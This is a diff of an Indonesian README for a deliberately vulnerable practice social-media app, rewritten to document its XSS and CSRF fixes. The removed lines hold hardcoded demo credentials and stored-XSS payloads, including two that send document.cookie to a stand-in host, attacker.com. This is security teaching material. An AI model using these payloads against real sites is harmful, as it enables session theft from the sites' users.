@@ -1,156 +1,129 @@
-# 🔓 Simple Social Media - Vulnerable Web Application
 
-**⚠️ PERHATIAN: Aplikasi ini SENGAJA dibuat vulnerable untuk tujuan pembelajaran Penetration Testing!**
+# 🔒 Simple Social Media - SECURED Web Application
 
-## Deskripsi
+**✅ STATUS: SECURED - Proteksi XSS Stored & CSRF sudah diimplementasikan!**
 
-Aplikasi social media sederhana yang mengandung vulnerabilities berikut:
-- **Stored XSS** (Cross-Site Scripting)
-- **CSRF** (Cross-Site Request Forgery)
+## 📋 Daftar Isi
+1. [Ringkasan Keamanan](#ringkasan-keamanan)
+2. [Proteksi XSS (Cross-Site Scripting)](#proteksi-xss-cross-site-scripting)
+3. [Proteksi CSRF (Cross-Site Request Forgery)](#proteksi-csrf-cross-site-request-forgery)
+4. [Implementasi Keamanan Tambahan](#implementasi-keamanan-tambahan)
+5. [Cara Testing Keamanan](#cara-testing-keamanan)
+6. [Migrasi dari Versi Vulnerable](#migrasi-dari-versi-vulnerable)
 
-## Teknologi
+---
 
-- **Backend**: Node.js + Express
-- **Frontend**: React + Vite
-- **Database**: In-memory (simulasi)
+## 🎯 Ringkasan Keamanan
 
-## Instalasi
+Aplikasi ini telah diamankan dari dua kerentanan utama:
+- **XSS Stored (Cross-Site Scripting)**
+- **CSRF (Cross-Site Request Forgery)**
 
-### 1. Backend Setup
+### Status Keamanan: ✅ SECURED
 
-```bash
-cd backend
-npm install
-npm start
-```
+| Vulnerability | Status | Implementation |
+|--------------|--------|----------------|
+| XSS Stored | ✅ Fixed | DOMPurify sanitization (backend & frontend) |
+| CSRF | ✅ Fixed | Custom CSRF token implementation |
+| CORS | ✅ Fixed | Strict origin policy |
+| Cookie Security | ✅ Fixed | HttpOnly, SameSite=Strict |
+| Security Headers | ✅ Fixed | Helmet.js implementation |
+| Rate Limiting | ✅ Fixed | Express rate limit |
 
-Server akan berjalan di `http://localhost:3000`
+---
 
-### 2. Frontend Setup
+## 🛡️ Proteksi XSS (Cross-Site Scripting)
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+XSS Stored adalah serangan di mana script berbahaya disimpan di server (database) dan dieksekusi setiap kali halaman dimuat oleh user lain.
 
-Frontend akan berjalan di `http://localhost:5173`
+Proteksi dilakukan dengan sanitasi input di backend (middleware/xss.middleware.js) dan output di frontend (DOMPurify di App.jsx).
 
-## User Accounts (Hardcoded)
+**Testing XSS Protection:**
+- Payload `<script>alert('XSS')</script>` akan dihapus
+- Payload `<img src=x onerror="alert('XSS')">` event handler dihapus
+- Payload `<iframe src="javascript:alert('XSS')"></iframe>` dihapus
 
-| Username | Password | Email |
-|----------|----------|-------|
-| admin | admin123 | admin@vulnerable.com |
-| korban | 123456 | korban@target.com |
+---
 
-## 🎯 Vulnerability Testing
+## 🔐 Proteksi CSRF (Cross-Site Request Forgery)
 
-### 1. Stored XSS Attack
+CSRF adalah serangan yang memaksa user melakukan aksi yang tidak diinginkan pada aplikasi di mana mereka sudah terautentikasi.
 
-**Cara Test:**
-1. Login sebagai user manapun (admin atau korban)
-2. Buat post dengan payload XSS:
-   ```html
-   <script>alert('XSS Attack!')</script>
-   ```
-3. Post akan tersimpan di database dan dieksekusi setiap kali halaman dimuat
-4. Script akan berjalan di browser semua user yang melihat post tersebut
+Proteksi dilakukan dengan custom CSRF token (backend/middleware/csrf.middleware.js) dan validasi token di setiap request mutating (POST/PUT/DELETE) dari frontend.
 
-**Payload XSS untuk Cookie Stealing:**
-```html
-<script>document.location='http://attacker.com?cookie='+document.cookie</script>
-```
+**Testing CSRF Protection:**
+- Request tanpa token: 403 Forbidden
+- Request dengan token salah: 403 Forbidden
+- Request dengan token valid: 200 OK
 
-**Payload XSS Advanced:**
-```html
-<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
-```
+---
 
-**Mengapa Vulnerable?**
-- Backend tidak melakukan sanitasi input
-- Frontend menggunakan `dangerouslySetInnerHTML` untuk render post
-- Cookie tidak menggunakan `HttpOnly` flag
+## 🛠️ Implementasi Keamanan Tambahan
 
-### 2. CSRF Attack
+- Helmet.js: Security headers (CSP, HSTS, X-Frame-Options, dll)
+- Rate Limiting: Express rate limit (100 requests/15 menit)
+- Strict CORS: Hanya origin frontend yang sah
+- Secure Cookie: HttpOnly, SameSite=Strict, Secure
 
-**Cara Test:**
-1. Login sebagai "korban" di aplikasi (localhost:5173)
-2. Buka file `attacker-csrf.html` di browser
-3. Halaman attacker akan otomatis mengirim request untuk mengubah email
-4. Kembali ke aplikasi dan refresh - email sudah berubah!
+---
 
-**Mengapa Vulnerable?**
-- Tidak ada CSRF token validation
-- Endpoint `/change-email` menerima request dari origin manapun
-- CORS dikonfigurasi dengan `credentials: true` tanpa validasi proper
+## 🧪 Cara Testing Keamanan
 
-## 🛡️ Cara Memperbaiki Vulnerabilities
+### XSS
+1. Buat post dengan payload `<script>alert('XSS')</script>` → tag dihapus
+2. Buat post dengan payload `<img src=x onerror="alert('XSS')">` → event handler dihapus
+3. Coba payload lain dari XSS-PAYLOADS.md
 
-### Fix XSS:
+### CSRF
+1. Kirim request POST tanpa CSRF token → 403 Forbidden
+2. Coba serangan dari attacker-csrf.html → gagal
+3. Request dengan token valid → berhasil
 
-**Backend:**
-```javascript
-const sanitizeHtml = require('sanitize-html');
+### Security Headers
+1. Cek response headers di browser DevTools
+2. Pastikan CSP, HSTS, X-Frame-Options, dll aktif
 
-app.post('/post', (req, res) => {
-    const { content } = req.body;
-    const cleanContent = sanitizeHtml(content);
-    // Save cleanContent instead of raw content
-});
-```
+### Rate Limiting
+1. Spam request >100x dalam 15 menit → 429 Too Many Requests
 
-**Frontend:**
-```jsx
-// Gunakan text content, bukan innerHTML
-<div>{post.content}</div>
-// JANGAN gunakan dangerouslySetInnerHTML
-```
+---
 
-### Fix CSRF:
+## 🔄 Migrasi dari Versi Vulnerable
 
-**Backend:**
-```javascript
-const csrf = require('csurf');
-const csrfProtection = csrf({ cookie: true });
+### Backend
+- index.js: Tambah Helmet, Rate Limit, CSRF middleware
+- middleware/csrf.middleware.js: Baru (CSRF protection)
+- middleware/xss.middleware.js: Baru (XSS sanitization)
+- controllers/users.controller.js: Cookie aman, CSRF cleanup
+- controllers/posts.controller.js: Input otomatis disanitasi
+- routes/users.route.js & posts.route.js: Tambah CSRF protection
+- package.json: Tambah dependencies keamanan
 
-app.post('/change-email', csrfProtection, (req, res) => {
-    // Validate CSRF token
-});
-```
+### Frontend
+- src/App.jsx: CSRF token handling, DOMPurify sanitization
+- package.json: Tambah dompurify
 
-**Frontend:**
-```javascript
-// Include CSRF token in request
-const csrfToken = document.querySelector('[name=csrf-token]').content;
-fetch('/change-email', {
-    headers: { 'CSRF-Token': csrfToken }
-});
-```
+### Cara Migrasi
+1. Install dependencies
+2. Update file backend & frontend
+3. Test semua endpoint dan payload
 
-**Cookie Security:**
-```javascript
-res.cookie('user', username, {
-    httpOnly: true,      // Prevent XSS access
-    secure: true,        // HTTPS only
-    sameSite: 'strict'   // Prevent CSRF
-});
-```
+---
 
-## 📚 Learning Objectives
+## 📚 Referensi
 
-Aplikasi ini dibuat untuk memahami:
-1. Bagaimana XSS attack bekerja dan dampaknya
-2. Bagaimana CSRF attack dapat mengeksploitasi kepercayaan browser
-3. Pentingnya input validation dan output encoding
-4. Cara mengimplementasikan security best practices
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [Helmet.js](https://helmetjs.github.io/)
+- [DOMPurify](https://github.com/cure53/DOMPurify)
+- [Express Rate Limit](https://github.com/express-rate-limit/express-rate-limit)
+
+---
 
 ## ⚠️ Disclaimer
 
-Aplikasi ini dibuat untuk tujuan pembelajaran cybersecurity. Jangan gunakan untuk:
-- Production environment
-- Menyimpan data sensitif
-- Attack terhadap sistem tanpa izin
+Aplikasi ini untuk tujuan edukasi. Jangan gunakan untuk production atau data sensitif.
 
 ## 📝 License
 
-Educational purposes only - MIT License
+MIT License
